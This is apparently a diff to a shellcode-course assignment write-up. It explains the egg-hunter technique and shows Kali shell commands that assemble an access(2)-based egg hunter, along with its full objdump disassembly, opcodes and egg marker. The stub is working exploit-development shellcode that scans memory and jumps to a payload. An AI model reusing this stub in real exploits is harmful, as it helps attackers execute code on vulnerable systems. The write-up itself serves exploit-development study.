@@ -27,3 +27,41 @@ reliably jump to it & execute it).
 through memory, looking for this marker.When it finds it, it will start executing the code that is placed right after the marker using a 
 jmp or call instruction.This means that we will have to define the marker in the egg hunter code, and also write it just in front of the 
 actual shellcode.
+
+
+b.Create a working demo of the Egghunter
+Prepare a Egghunter NASM file based on  http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf [access(2) revisited]
+
+root@kali:/home/SLAE/MY_EXP/Assignment3# nasm -f elf EggHunter_assignment3.nasm
+root@kali:/home/SLAE/MY_EXP/Assignment3# ld -o EggHunter_assignment3 EggHunter_assignment3.o
+root@kali:/home/SLAE/MY_EXP/Assignment3# objdump -D EggHunter_assignment3 -M intel
+
+EggHunter_assignment3:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060:       31 db                   xor    ebx,ebx
+ 8048062:       31 c9                   xor    ecx,ecx
+ 8048064:       f7 e1                   mul    ecx
+
+08048066 <memory_block>:
+ 8048066:       66 81 ca ff 0f          or     dx,0xfff
+
+0804806b <search>:
+ 804806b:       42                      inc    edx
+ 804806c:       8d 5a 04                lea    ebx,[edx+0x4]
+ 804806f:       6a 21                   push   0x21
+ 8048071:       58                      pop    eax
+ 8048072:       cd 80                   int    0x80
+ 8048074:       3c f2                   cmp    al,0xf2
+ 8048076:       74 ee                   je     8048066 <memory_block>
+ 8048078:       b8 74 30 30 6c          mov    eax,0x6c303074
+ 804807d:       89 d7                   mov    edi,edx
+ 804807f:       af                      scas   eax,DWORD PTR es:[edi]
+ 8048080:       75 e9                   jne    804806b <search>
+ 8048082:       af                      scas   eax,DWORD PTR es:[edi]
+ 8048083:       75 e6                   jne    804806b <search>
+ 8048085:       ff e7                   jmp    edi
+root@kali:/home/SLAE/MY_EXP/Assignment3#
